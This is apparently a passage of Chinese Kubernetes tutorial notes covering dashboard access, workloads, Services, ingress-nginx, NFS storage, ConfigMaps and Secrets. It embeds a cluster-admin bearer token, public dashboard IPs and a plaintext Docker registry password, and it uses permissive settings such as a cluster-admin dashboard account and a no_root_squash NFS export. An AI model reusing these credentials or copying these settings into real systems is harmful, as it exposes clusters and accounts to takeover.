NoSchedule      volumes:        - name: tmp-volume          emptyDir: &#123;&#125;

Ⅱ设置访问端口kubectl edit svc kubernetes-dashboard -n kubernetes-dashboard

type: ClusterIP 改为 type: NodePort
kubectl get svc -A |grep kubernetes-dashboard## 找到端口，在安全组放行

访问： https://集群任意IP:端口      https://139.198.165.238:32759
Ⅲ、创建访问账号#创建访问账号，准备一个yaml文件； vi dash.yamlapiVersion: v1kind: ServiceAccountmetadata:  name: admin-user  namespace: kubernetes-dashboard---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: admin-userroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: cluster-adminsubjects:- kind: ServiceAccount  name: admin-user  namespace: kubernetes-dashboard

kubectl apply -f dash.yaml

Ⅳ令牌访问#获取访问令牌kubectl -n kubernetes-dashboard get secret $(kubectl -n kubernetes-dashboard get sa/admin-user -o jsonpath=&quot;&#123;.secrets[0].name&#125;&quot;) -o go-template=&quot;&#123;&#123;.data.token | base64decode&#125;&#125;&quot;

eyJhbGciOiJSUzI1NiIsImtpZCI6InpXSkU0TjhCUmVKQzBJaC03Nk9ES2NMZ1daRTRmQ1FMZU9rRUJ3VXRnM3MifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlcm5ldGVzLWRhc2hib2FyZCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJhZG1pbi11c2VyLXRva2VuLXgyczhmIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImFkbWluLXVzZXIiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIzOTZmYjdlNS0wMjA2LTQxMjctOGQzYS0xMzRlODVmYjU0MDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZXJuZXRlcy1kYXNoYm9hcmQ6YWRtaW4tdXNlciJ9.Hf5mhl35_R0iBfBW7fF198h_klEnN6pRKfk_roAzOtAN-Aq21E4804PUhe9Rr9e_uFzLfoFDXacjJrHCuhiML8lpHIfJLK_vSD2pZNaYc2NWZq2Mso-BMGpObxGA23hW0nLQ5gCxlnxIAcyE76aYTAB6U8PxpvtVdgUknBVrwXG8UC_D8kHm9PTwa9jgbZfSYAfhOHWmZxNYo7CF2sHH-AT_WmIE8xLmB7J11vDzaunv92xoUoI0ju7OBA2WRr61bOmSd8WJgLCDcyBblxz4Wa-3zghfKlp0Rgb8l56AAI7ML_snF59X6JqaCuAcCJjIu0FUTS5DuyIObEeXY-z-Rw

Ⅴ界面
Kubernetes核心实战一.资源创建方式
命令行
YAML

二.Namespace名称空间用来隔离资源
kubectl create ns hellokubectl delete ns hello

apiVersion: v1kind: Namespacemetadata:  name: hello

三.pod&#96;运行中的一组容器，Pod是kubernetes中应用的最小单位.

kubectl run mynginx --image=nginx# 查看default名称空间的Podkubectl get pod # 描述kubectl describe pod 你自己的Pod名字# 删除kubectl delete pod Pod名字# 查看Pod的运行日志kubectl logs Pod名字# 每个Pod - k8s都会分配一个ipkubectl get pod -owide# 使用Pod的ip+pod里面运行容器的端口curl 192.168.169.136# 集群中的任意一个机器以及任意的应用都能通过Pod分配的ip来访问这个Pod

apiVersion: v1kind: Podmetadata:  labels:    run: mynginx  name: mynginx#  namespace: defaultspec:  containers:  - image: nginx    name: mynginx

apiVersion: v1kind: Podmetadata:   labels:    run: myapp   name: myappspec:  containers  - image: nginx    name: nginx  - image: tomcat:8.5.68    name: tomcat


此时的应用还不能外部访问
四.Deployment控制Pod，使Pod拥有多副本，自愈，扩缩容等能力
# 清除所有Pod，比较下面两个命令有何不同效果？kubectl run mynginx --image=nginxkubectl create deployment mytomcat --image=tomcat:8.5.68# 自愈能力

1.多副本kubectl create deployment my-dep --image=nginx --replicas=3

apiVersion: apps/v1kind: Deploymentmetadata:  labels:    app: my-dep  name: my-depspec:  replicas: 3  selector:    matchLabels:      app: my-dep  template:    metadata:      labels:        app: my-dep    spec:      containers:      - image: nginx        name: nginx

2.扩缩容kubectl scale --replicas=5 deployment/my-dep

kubectl edit deployment my-dep#修改replicas

3.自愈&amp;故障转移
停机
删除Pod
容器崩溃

4.滚动更新kubectl set image deployment/my-dep nginx=nginx:1.16.1 --recordkubectl rollout status deployment/my-dep

5.版本回退#历史记录kubectl rollout history deployment/my-dep#查看某个历史详情kubectl rollout history deployment/my-dep --revision=2#回滚(回到上次)kubectl rollout undo deployment/my-dep#回滚(回到指定版本)kubectl rollout undo deployment/my-dep --to-revision=2

更多：
除了Deployment，k8s还有 StatefulSet 、DaemonSet 、Job  等 类型资源。我们都称为 工作负载。
有状态应用使用  StatefulSet  部署，无状态应用使用 Deployment 部署
https://kubernetes.io/zh/docs/concepts/workloads/controllers/
五.Service将一组Pod公开为网络服务的抽象方法
#暴露Deploykubectl expose deployment my-dep --port=8000 --target-port=80#使用标签检索Podkubectl get pod -l app=my-dep

apiVersion: v1kind: Servicemetadata:  labels:    app: my-dep  name: my-depspec:  selector:    app: my-dep  ports:  - port: 8000    protocol: TCP    targetPort: 80

1、ClusterIP# 等同于没有--type的kubectl expose deployment my-dep --port=8000 --target-port=80 --type=ClusterIP

apiVersion: v1kind: Servicemetadata:  labels:    app: my-dep  name: my-depspec:  ports:  - port: 8000    protocol: TCP    targetPort: 80  selector:    app: my-dep  type: ClusterIP

2,NodePortkubectl expose deployment my-dep --port=8000 --target-port=80 --type=NodePort

apiVersion: v1kind: Servicemetadata:  labels:    app: my-dep  name: my-depspec:  ports:  - port: 8000    protocol: TCP    targetPort: 80  selector:    app: my-dep  type: NodePort

NodePort范围在 30000-32767 之间
六.Ingress1.安装wget https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.47.0/deploy/static/provider/baremetal/deploy.yaml#修改镜像vi deploy.yaml#将image的值改为如下值：registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/ingress-nginx-controller:v0.46.0# 检查安装的结果kubectl get pod,svc -n ingress-nginx# 最后别忘记把svc暴露的端口要放行


如果下载不到，用以下文件
apiVersion: v1kind: Namespacemetadata:  name: ingress-nginx  labels:    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx---# Source: ingress-nginx/templates/controller-serviceaccount.yamlapiVersion: v1kind: ServiceAccountmetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: controller  name: ingress-nginx  namespace: ingress-nginxautomountServiceAccountToken: true---# Source: ingress-nginx/templates/controller-configmap.yamlapiVersion: v1kind: ConfigMapmetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: controller  name: ingress-nginx-controller  namespace: ingress-nginxdata:---# Source: ingress-nginx/templates/clusterrole.yamlapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm  name: ingress-nginxrules:  - apiGroups:      - &#x27;&#x27;    resources:      - configmaps      - endpoints      - nodes      - pods      - secrets    verbs:      - list      - watch  - apiGroups:      - &#x27;&#x27;    resources:      - nodes    verbs:      - get  - apiGroups:      - &#x27;&#x27;    resources:      - services    verbs:      - get      - list      - watch  - apiGroups:      - extensions      - networking.k8s.io   # k8s 1.14+    resources:      - ingresses    verbs:      - get      - list      - watch  - apiGroups:      - &#x27;&#x27;    resources:      - events    verbs:      - create      - patch  - apiGroups:      - extensions      - networking.k8s.io   # k8s 1.14+    resources:      - ingresses/status    verbs:      - update  - apiGroups:      - networking.k8s.io   # k8s 1.14+    resources:      - ingressclasses    verbs:      - get      - list      - watch---# Source: ingress-nginx/templates/clusterrolebinding.yamlapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm  name: ingress-nginxroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: ingress-nginxsubjects:  - kind: ServiceAccount    name: ingress-nginx    namespace: ingress-nginx---# Source: ingress-nginx/templates/controller-role.yamlapiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: controller  name: ingress-nginx  namespace: ingress-nginxrules:  - apiGroups:      - &#x27;&#x27;    resources:      - namespaces    verbs:      - get  - apiGroups:      - &#x27;&#x27;    resources:      - configmaps      - pods      - secrets      - endpoints    verbs:      - get      - list      - watch  - apiGroups:      - &#x27;&#x27;    resources:      - services    verbs:      - get      - list      - watch  - apiGroups:      - extensions      - networking.k8s.io   # k8s 1.14+    resources:      - ingresses    verbs:      - get      - list      - watch  - apiGroups:      - extensions      - networking.k8s.io   # k8s 1.14+    resources:      - ingresses/status    verbs:      - update  - apiGroups:      - networking.k8s.io   # k8s 1.14+    resources:      - ingressclasses    verbs:      - get      - list      - watch  - apiGroups:      - &#x27;&#x27;    resources:      - configmaps    resourceNames:      - ingress-controller-leader-nginx    verbs:      - get      - update  - apiGroups:      - &#x27;&#x27;    resources:      - configmaps    verbs:      - create  - apiGroups:      - &#x27;&#x27;    resources:      - events    verbs:      - create      - patch---# Source: ingress-nginx/templates/controller-rolebinding.yamlapiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: controller  name: ingress-nginx  namespace: ingress-nginxroleRef:  apiGroup: rbac.authorization.k8s.io  kind: Role  name: ingress-nginxsubjects:  - kind: ServiceAccount    name: ingress-nginx    namespace: ingress-nginx---# Source: ingress-nginx/templates/controller-service-webhook.yamlapiVersion: v1kind: Servicemetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: controller  name: ingress-nginx-controller-admission  namespace: ingress-nginxspec:  type: ClusterIP  ports:    - name: https-webhook      port: 443      targetPort: webhook  selector:    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/component: controller---# Source: ingress-nginx/templates/controller-service.yamlapiVersion: v1kind: Servicemetadata:  annotations:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: controller  name: ingress-nginx-controller  namespace: ingress-nginxspec:  type: NodePort  ports:    - name: http      port: 80      protocol: TCP      targetPort: http    - name: https      port: 443      protocol: TCP      targetPort: https  selector:    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/component: controller---# Source: ingress-nginx/templates/controller-deployment.yamlapiVersion: apps/v1kind: Deploymentmetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: controller  name: ingress-nginx-controller  namespace: ingress-nginxspec:  selector:    matchLabels:      app.kubernetes.io/name: ingress-nginx      app.kubernetes.io/instance: ingress-nginx      app.kubernetes.io/component: controller  revisionHistoryLimit: 10  minReadySeconds: 0  template:    metadata:      labels:        app.kubernetes.io/name: ingress-nginx        app.kubernetes.io/instance: ingress-nginx        app.kubernetes.io/component: controller    spec:      dnsPolicy: ClusterFirst      containers:        - name: controller          image: registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/ingress-nginx-controller:v0.46.0          imagePullPolicy: IfNotPresent          lifecycle:            preStop:              exec:                command:                  - /wait-shutdown          args:            - /nginx-ingress-controller            - --election-id=ingress-controller-leader            - --ingress-class=nginx            - --configmap=$(POD_NAMESPACE)/ingress-nginx-controller            - --validating-webhook=:8443            - --validating-webhook-certificate=/usr/local/certificates/cert            - --validating-webhook-key=/usr/local/certificates/key          securityContext:            capabilities:              drop:                - ALL              add:                - NET_BIND_SERVICE            runAsUser: 101            allowPrivilegeEscalation: true          env:            - name: POD_NAME              valueFrom:                fieldRef:                  fieldPath: metadata.name            - name: POD_NAMESPACE              valueFrom:                fieldRef:                  fieldPath: metadata.namespace            - name: LD_PRELOAD              value: /usr/local/lib/libmimalloc.so          livenessProbe:            failureThreshold: 5            httpGet:              path: /healthz              port: 10254              scheme: HTTP            initialDelaySeconds: 10            periodSeconds: 10            successThreshold: 1            timeoutSeconds: 1          readinessProbe:            failureThreshold: 3            httpGet:              path: /healthz              port: 10254              scheme: HTTP            initialDelaySeconds: 10            periodSeconds: 10            successThreshold: 1            timeoutSeconds: 1          ports:            - name: http              containerPort: 80              protocol: TCP            - name: https              containerPort: 443              protocol: TCP            - name: webhook              containerPort: 8443              protocol: TCP          volumeMounts:            - name: webhook-cert              mountPath: /usr/local/certificates/              readOnly: true          resources:            requests:              cpu: 100m              memory: 90Mi      nodeSelector:        kubernetes.io/os: linux      serviceAccountName: ingress-nginx      terminationGracePeriodSeconds: 300      volumes:        - name: webhook-cert          secret:            secretName: ingress-nginx-admission---# Source: ingress-nginx/templates/admission-webhooks/validating-webhook.yaml# before changing this value, check the required kubernetes version# https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#prerequisitesapiVersion: admissionregistration.k8s.io/v1kind: ValidatingWebhookConfigurationmetadata:  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhook  name: ingress-nginx-admissionwebhooks:  - name: validate.nginx.ingress.kubernetes.io    matchPolicy: Equivalent    rules:      - apiGroups:          - networking.k8s.io        apiVersions:          - v1beta1        operations:          - CREATE          - UPDATE        resources:          - ingresses    failurePolicy: Fail    sideEffects: None    admissionReviewVersions:      - v1      - v1beta1    clientConfig:      service:        namespace: ingress-nginx        name: ingress-nginx-controller-admission        path: /networking/v1beta1/ingresses---# Source: ingress-nginx/templates/admission-webhooks/job-patch/serviceaccount.yamlapiVersion: v1kind: ServiceAccountmetadata:  name: ingress-nginx-admission  annotations:    helm.sh/hook: pre-install,pre-upgrade,post-install,post-upgrade    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhook  namespace: ingress-nginx---# Source: ingress-nginx/templates/admission-webhooks/job-patch/clusterrole.yamlapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  name: ingress-nginx-admission  annotations:    helm.sh/hook: pre-install,pre-upgrade,post-install,post-upgrade    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhookrules:  - apiGroups:      - admissionregistration.k8s.io    resources:      - validatingwebhookconfigurations    verbs:      - get      - update---# Source: ingress-nginx/templates/admission-webhooks/job-patch/clusterrolebinding.yamlapiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: ingress-nginx-admission  annotations:    helm.sh/hook: pre-install,pre-upgrade,post-install,post-upgrade    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhookroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: ingress-nginx-admissionsubjects:  - kind: ServiceAccount    name: ingress-nginx-admission    namespace: ingress-nginx---# Source: ingress-nginx/templates/admission-webhooks/job-patch/role.yamlapiVersion: rbac.authorization.k8s.io/v1kind: Rolemetadata:  name: ingress-nginx-admission  annotations:    helm.sh/hook: pre-install,pre-upgrade,post-install,post-upgrade    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhook  namespace: ingress-nginxrules:  - apiGroups:      - &#x27;&#x27;    resources:      - secrets    verbs:      - get      - create---# Source: ingress-nginx/templates/admission-webhooks/job-patch/rolebinding.yamlapiVersion: rbac.authorization.k8s.io/v1kind: RoleBindingmetadata:  name: ingress-nginx-admission  annotations:    helm.sh/hook: pre-install,pre-upgrade,post-install,post-upgrade    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhook  namespace: ingress-nginxroleRef:  apiGroup: rbac.authorization.k8s.io  kind: Role  name: ingress-nginx-admissionsubjects:  - kind: ServiceAccount    name: ingress-nginx-admission    namespace: ingress-nginx---# Source: ingress-nginx/templates/admission-webhooks/job-patch/job-createSecret.yamlapiVersion: batch/v1kind: Jobmetadata:  name: ingress-nginx-admission-create  annotations:    helm.sh/hook: pre-install,pre-upgrade    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhook  namespace: ingress-nginxspec:  template:    metadata:      name: ingress-nginx-admission-create      labels:        helm.sh/chart: ingress-nginx-3.33.0        app.kubernetes.io/name: ingress-nginx        app.kubernetes.io/instance: ingress-nginx        app.kubernetes.io/version: 0.47.0        app.kubernetes.io/managed-by: Helm        app.kubernetes.io/component: admission-webhook    spec:      containers:        - name: create          image: docker.io/jettech/kube-webhook-certgen:v1.5.1          imagePullPolicy: IfNotPresent          args:            - create            - --host=ingress-nginx-controller-admission,ingress-nginx-controller-admission.$(POD_NAMESPACE).svc            - --namespace=$(POD_NAMESPACE)            - --secret-name=ingress-nginx-admission          env:            - name: POD_NAMESPACE              valueFrom:                fieldRef:                  fieldPath: metadata.namespace      restartPolicy: OnFailure      serviceAccountName: ingress-nginx-admission      securityContext:        runAsNonRoot: true        runAsUser: 2000---# Source: ingress-nginx/templates/admission-webhooks/job-patch/job-patchWebhook.yamlapiVersion: batch/v1kind: Jobmetadata:  name: ingress-nginx-admission-patch  annotations:    helm.sh/hook: post-install,post-upgrade    helm.sh/hook-delete-policy: before-hook-creation,hook-succeeded  labels:    helm.sh/chart: ingress-nginx-3.33.0    app.kubernetes.io/name: ingress-nginx    app.kubernetes.io/instance: ingress-nginx    app.kubernetes.io/version: 0.47.0    app.kubernetes.io/managed-by: Helm    app.kubernetes.io/component: admission-webhook  namespace: ingress-nginxspec:  template:    metadata:      name: ingress-nginx-admission-patch      labels:        helm.sh/chart: ingress-nginx-3.33.0        app.kubernetes.io/name: ingress-nginx        app.kubernetes.io/instance: ingress-nginx        app.kubernetes.io/version: 0.47.0        app.kubernetes.io/managed-by: Helm        app.kubernetes.io/component: admission-webhook    spec:      containers:        - name: patch          image: docker.io/jettech/kube-webhook-certgen:v1.5.1          imagePullPolicy: IfNotPresent          args:            - patch            - --webhook-name=ingress-nginx-admission            - --namespace=$(POD_NAMESPACE)            - --patch-mutating=false            - --secret-name=ingress-nginx-admission            - --patch-failure-policy=Fail          env:            - name: POD_NAMESPACE              valueFrom:                fieldRef:                  fieldPath: metadata.namespace      restartPolicy: OnFailure      serviceAccountName: ingress-nginx-admission      securityContext:        runAsNonRoot: true        runAsUser: 2000

2.使用官网地址：https://kubernetes.github.io/ingress-nginx/就是nginx做的

https://139.198.163.211:32401/
http://139.198.163.211:31405/
测试环境应用如下yaml，准备好测试环境
apiVersion: apps/v1kind: Deploymentmetadata:  name: hello-serverspec:  replicas: 2  selector:    matchLabels:      app: hello-server  template:    metadata:      labels:        app: hello-server    spec:      containers:      - name: hello-server        image: registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/hello-server        ports:        - containerPort: 9000---apiVersion: apps/v1kind: Deploymentmetadata:  labels:    app: nginx-demo  name: nginx-demospec:  replicas: 2  selector:    matchLabels:      app: nginx-demo  template:    metadata:      labels:        app: nginx-demo    spec:      containers:      - image: nginx        name: nginx---apiVersion: v1kind: Servicemetadata:  labels:    app: nginx-demo  name: nginx-demospec:  selector:    app: nginx-demo  ports:  - port: 8000    protocol: TCP    targetPort: 80---apiVersion: v1kind: Servicemetadata:  labels:    app: hello-server  name: hello-serverspec:  selector:    app: hello-server  ports:  - port: 8000    protocol: TCP    targetPort: 9000

①域名访问apiVersion: networking.k8s.io/v1kind: Ingress  metadata:  name: ingress-host-barspec:  ingressClassName: nginx  rules:  - host: &quot;hello.atguigu.com&quot;    http:      paths:      - pathType: Prefix        path: &quot;/&quot;        backend:          service:            name: hello-server            port:              number: 8000  - host: &quot;demo.atguigu.com&quot;    http:      paths:      - pathType: Prefix        path: &quot;/nginx&quot;  # 把请求会转给下面的服务，下面的服务一定要能处理这个路径，不能处理就是404        backend:          service:            name: nginx-demo  ## java，比如使用路径重写，去掉前缀nginx            port:              number: 8000

问题： path: &quot;/nginx&quot; 与  path: &quot;/&quot; 为什么会有不同的效果？
②路径重写apiVersion: networking.k8s.io/v1kind: Ingress  metadata:  annotations:    nginx.ingress.kubernetes.io/rewrite-target: /$2  name: ingress-host-barspec:  ingressClassName: nginx  rules:  - host: &quot;hello.atguigu.com&quot;    http:      paths:      - pathType: Prefix        path: &quot;/&quot;        backend:          service:            name: hello-server            port:              number: 8000  - host: &quot;demo.atguigu.com&quot;    http:      paths:      - pathType: Prefix        path: &quot;/nginx(/|$)(.*)&quot;  # 把请求会转给下面的服务，下面的服务一定要能处理这个路径，不能处理就是404        backend:          service:            name: nginx-demo  ## java，比如使用路径重写，去掉前缀nginx            port:              number: 8000              

③流量限制apiVersion: networking.k8s.io/v1kind: Ingressmetadata:  name: ingress-limit-rate  annotations:    nginx.ingress.kubernetes.io/limit-rps: &quot;1&quot;spec:  ingressClassName: nginx  rules:  - host: &quot;haha.atguigu.com&quot;    http:      paths:      - pathType: Exact        path: &quot;/&quot;        backend:          service:            name: nginx-demo            port:              number: 8000

七.存储抽象类环境准备1.所有节点#所有机器安装yum install -y nfs-utils

2.主节点#nfs主节点echo &quot;/nfs/data/ *(insecure,rw,sync,no_root_squash)&quot; &gt; /etc/exportsmkdir -p /nfs/datasystemctl enable rpcbind --nowsystemctl enable nfs-server --now#配置生效exportfs -r

3.从节点showmount -e 172.31.0.4#执行以下命令挂载 nfs 服务器上的共享目录到本机路径 /root/nfsmountmkdir -p /nfs/datamount -t nfs 172.31.0.4:/nfs/data /nfs/data# 写入一个测试文件echo &quot;hello nfs server&quot; &gt; /nfs/data/test.txt

4.原生方式数据挂载弊端：无法指定分配大小
apiVersion: apps/v1kind: Deploymentmetadata:  labels:    app: nginx-pv-demo  name: nginx-pv-demospec:  replicas: 2  selector:    matchLabels:      app: nginx-pv-demo  template:    metadata:      labels:        app: nginx-pv-demo    spec:      containers:      - image: nginx        name: nginx        volumeMounts:        - name: html          mountPath: /usr/share/nginx/html      volumes:        - name: html          nfs:            server: 172.31.0.4            path: /nfs/data/nginx-pv        

1.PV&amp;PVCPV:持久卷(Persistent Volume),将应用需要持久化的数据保存到指定位置
PVC: 持久卷声明(Persistent Volume Claim),声明需要使用的持久卷规格
①.创建pv池静态供应
#nfs主节点mkdir -p /nfs/data/01mkdir -p /nfs/data/02mkdir -p /nfs/data/03

创建PV
apiVersion: v1kind: PersistentVolumemetadata:  name: pv01-10mspec:  capacity:    storage: 10M  accessModes:    - ReadWriteMany  storageClassName: nfs  nfs:    path: /nfs/data/01    server: 172.31.0.4---apiVersion: v1kind: PersistentVolumemetadata:  name: pv02-1gispec:  capacity:    storage: 1Gi  accessModes:    - ReadWriteMany  storageClassName: nfs  nfs:    path: /nfs/data/02    server: 172.31.0.4---apiVersion: v1kind: PersistentVolumemetadata:  name: pv03-3gispec:  capacity:    storage: 3Gi  accessModes:    - ReadWriteMany  storageClassName: nfs  nfs:    path: /nfs/data/03    server: 172.31.0.4

②. PVC创建与绑定创建PVC
kind: PersistentVolumeClaimapiVersion: v1metadata:  name: nginx-pvcspec:  accessModes:    - ReadWriteMany  resources:    requests:      storage: 200Mi  storageClassName: nfs

创建Pod绑定PVC
apiVersion: apps/v1kind: Deploymentmetadata:  labels:    app: nginx-deploy-pvc  name: nginx-deploy-pvcspec:  replicas: 2  selector:    matchLabels:      app: nginx-deploy-pvc  template:    metadata:      labels:        app: nginx-deploy-pvc    spec:      containers:      - image: nginx        name: nginx        volumeMounts:        - name: html          mountPath: /usr/share/nginx/html      volumes:        - name: html          persistentVolumeClaim:            claimName: nginx-pvc

2.ConfigMap抽取应用配置，并且可以自动更新
①redis示例Ⅰ把之前的配置文件创建为配置集# 创建配置，redis保存到k8s的etcd；kubectl create cm redis-conf --from-file=redis.conf

apiVersion: v1data:    #data是所有真正的数据，key：默认是文件名   value：配置文件的内容  redis.conf: |    appendonly yeskind: ConfigMapmetadata:  name: redis-conf  namespace: default

Ⅱ创建PodapiVersion: v1kind: Podmetadata:  name: redisspec:  containers:  - name: redis    image: redis    command:      - redis-server      - &quot;/redis-master/redis.conf&quot;  #指的是redis容器内部的位置    ports:    - containerPort: 6379    volumeMounts:    - mountPath: /data      name: data    - mountPath: /redis-master      name: config  volumes:    - name: data      emptyDir: &#123;&#125;    - name: config      configMap:        name: redis-conf        items:        - key: redis.conf          path: redis.conf

Ⅲ检查默认配置kubectl exec -it redis -- redis-cli127.0.0.1:6379&gt; CONFIG GET appendonly127.0.0.1:6379&gt; CONFIG GET requirepass

Ⅳ修改ConfigMapapiVersion: v1kind: ConfigMapmetadata:  name: example-redis-configdata:  redis-config: |    maxmemory 2mb    maxmemory-policy allkeys-lru 

Ⅴ检查配置是否更新kubectl exec -it redis -- redis-cli127.0.0.1:6379&gt; CONFIG GET maxmemory127.0.0.1:6379&gt; CONFIG GET maxmemory-policy

检查指定文件内容是否已经更新
修改了CM。Pod里面的配置文件会跟着变
配置值未更改，因为需要重新启动 Pod 才能从关联的 ConfigMap 中获取更新的值。 
原因：我们的Pod部署的中间件自己本身没有热更新能力
3.SecretSecret 对象类型用来保存敏感信息，例如密码、OAuth 令牌和 SSH 密钥。 将这些信息放在 secret 中比放在 Pod 的定义或者 容器镜像 中来说更加安全和灵活。
kubectl create secret docker-registry leifengyang-docker \--docker-username=leifengyang \--docker-password=Lfy123456 \--docker-email=534096094@qq.com##命令格式kubectl create secret docker-registry regcred \  --docker-server=&lt;你的镜像仓库服务器&gt; \  --docker-username=&lt;你的用户名&gt; \  --docker-password=&lt;你的密码&gt; \  --docker-email=&lt;你的邮箱地址&gt;

apiVersion: v1kind: Podmetadata:  name: private-nginxspec:  containers:  - name: private-nginx    image: leifengyang/guignginx:v1.0  imagePullSecrets:  - name: leifengyang-docker

KuberSphere平台安装
https://kubesphere.com.cn/
Kubernetes上安装Kubesphere安装步骤
选择4核8G（master）、8核16G（node1）、8核16G（node2） 三台机器，按量付费进行实验，CentOS7.9

安装Docker

安装Kubernetes

安装KubeSphere前置环境

安装KubeSphere


